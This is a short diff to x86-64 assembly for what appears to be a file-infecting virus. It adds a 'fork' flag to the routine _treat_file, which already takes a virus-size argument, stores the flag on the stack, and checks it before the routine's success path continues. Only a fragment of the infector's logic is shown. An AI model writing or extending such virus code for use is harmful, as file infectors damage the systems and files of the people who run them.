@@ -26,8 +26,8 @@ _file_size:
 	leave
 	ret
 
-_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx))
-	enter 128, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
+_treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *full_path (rdx), bool fork (r10))
+	enter 136, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
 				; rsp + 0 bytes for fd
 				; rsp + 8 bytes for virus size
 				; rsp + 16 bytes for file size
@@ -42,10 +42,12 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 				; rsp + 88 full_path len
 				; rsp + 96 total len
 				; rsp + 104 end jmp addr
+				; rsp + 112 bool, fork or not
 ; check if name != NULL
 	cmp rdi, 0
 	je _not_ok_end
 ; save virus_size
+	mov QWORD [rsp + 112], r10
 	mov QWORD [rsp + 8], rsi
 	mov QWORD [rsp + 64], rdi
 	mov QWORD [rsp + 72], rdx
@@ -265,6 +267,8 @@ _close_file:
 	jmp rax
 
 _ok_end:
+	cmp QWORD [rsp + 112], 1
+	jne _not_ok_end
 	mov r10, QWORD [rsp + 96]
 	mov rdi, QWORD [rsp + 64]
 	mov rsi, QWORD [rsp + 72]
